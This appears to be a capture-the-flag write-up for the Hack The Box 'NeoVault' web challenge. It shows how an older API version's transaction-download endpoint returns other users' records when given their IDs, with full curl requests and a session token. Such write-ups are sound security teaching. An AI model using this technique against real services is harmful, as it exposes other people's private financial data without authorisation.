---
slug: /write-up/htb/challenges/neo-vault
pagination_next: null
pagination_prev: null
---

# NeoVault

https://app.hackthebox.com/challenges/NeoVault

Neovault is a trusted banking app for fund transfers and downloading transaction history. You're invited to explore the app, find potential vulnerabilities, and uncover the hidden flag within.

We are given access to an instance IP and port.

The JS code is bundled with webpack. Let's analyze the app with `whatweb`:

```bash
└─$ whatweb 94.237.54.192:34875
http://94.237.54.192:34875 [200 OK] Country[FINLAND][FI], HTML5, HTTPServer[nginx/1.22.1], IP[94.237.54.192], PasswordField[password], Script, Title[NeoVault], UncommonHeaders[x-nextjs-cache,x-nextjs-prerender,x-nextjs-stale-time], X-Powered-By[Next.js], nginx[1.22.1]
```

A webapp built with nextjs, bundled with webpack. No sourcemaps available

This doesn't reveal much. The application does not show much option to interact with, there's only login and create an account. Let's do it!

Checking the source code, looks like it's bundled with webpack, we can use prettier to "deofuscate" it: https://prettier.io/playground

Checking the code we can find the backend endppoints:

```javascript
      let a = {
        endpointsV1: {
          me: "/api/v1/auth/me",
          login: "/api/v1/auth/login",
          register: "/api/v1/auth/register",
          logout: "/api/v1/auth/logout",
          changeEmail: "/api/v1/auth/change-email",
          transactions: "/api/v1/transactions",
          deposit: "/api/v1/transactions/deposit",
          balanceHistory: "/api/v1/transactions/balance-history",
          categoryPercentages: "/api/v1/transactions/categories-spending",
          downloadTransactions: "/api/v1/transactions/download-transactions",
        },
        endpointsV2: {
          me: "/api/v2/auth/me",
          login: "/api/v2/auth/login",
          register: "/api/v2/auth/register",
          logout: "/api/v2/auth/logout",
          changeEmail: "/api/v2/auth/change-email",
          transactions: "/api/v2/transactions",
          deposit: "/api/v2/transactions/deposit",
          balanceHistory: "/api/v2/transactions/balance-history",
          categoryPercentages: "/api/v2/transactions/categories-spending",
          downloadTransactions: "/api/v2/transactions/download-transactions",
          inquireUser: "/api/v2/auth/inquire",
        },
```

Potentially the last endpoint allows us to enumerate the users. If we pay attention to the visible deposit, we can see it's coming from `neo_system`.

If we call the inquie endpoint, we can see its id:

```json
{"_id":"688cf823d181feda936b9d54","username":"neo_system"}
```

In the PDF download button, if we change from v2 to v1, we get the following message:

```json
{"message":"_id is not provided"}
```
which ressembles to MongoDB database error: https://stackoverflow.com/questions/24427845/can-not-find-a-record-by-its-id-in-mongodb

```bash
curl 'http://94.237.61.242:59723/api/v1/transactions/download-transactions' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Content-Type: application/json' \
  -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY4OGNmOTI4ZDE4MWZlZGE5MzZiOWQ2MyIsImlhdCI6MTc1NDA3MDA2NywiZXhwIjoxNzU0MDczNjY3fQ.BfcX5Fsdizd99JwxO6sY5shQNLrdxq6iIpYkqP_cX-8' \
  -H 'Origin: http://94.237.61.242:59723' \
  -H 'Proxy-Connection: keep-alive' \
  -H 'Referer: http://94.237.61.242:59723/dashboard/transactions' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36' \
  --data-raw '{"_id":"688cf823d181feda936b9d54","username":"neo_system"}' \
  --insecure
  ```

  And it works, we can see it made a deposit to a user named `user_with_flag`. Let's enquire the user:

  ```json
{"_id":"688cf823d181feda936b9d59","username":"user_with_flag"}
  ```

  and retrieve the transactions again for this user:


  ```bash
  curl 'http://94.237.61.242:59723/api/v1/transactions/download-transactions' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Content-Type: application/json' \
  -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY4OGNmOTI4ZDE4MWZlZGE5MzZiOWQ2MyIsImlhdCI6MTc1NDA3MDA2NywiZXhwIjoxNzU0MDczNjY3fQ.BfcX5Fsdizd99JwxO6sY5shQNLrdxq6iIpYkqP_cX-8' \
  -H 'Origin: http://94.237.61.242:59723' \
  -H 'Proxy-Connection: keep-alive' \
  -H 'Referer: http://94.237.61.242:59723/dashboard/transactions' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36' \
  --data-raw '{"_id":"688cf823d181feda936b9d59","username":"user_with_flag"}' \
  --insecure
  ```

  And we can see the secret into the PDF